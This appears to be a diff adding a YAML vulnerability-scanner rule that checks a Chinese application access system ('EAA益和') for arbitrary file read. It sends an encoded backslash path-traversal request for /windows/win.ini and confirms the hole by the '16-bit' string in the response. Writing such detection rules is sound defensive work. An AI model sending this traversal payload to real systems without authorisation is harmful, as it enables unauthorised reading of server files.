@@ -1,0 +1,11 @@
+name: EAA益和应用接入系统-Diretory
+description: >-
+  任意文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini
+    expression:
+      status: 200
+      body_all: ["16-bit"]
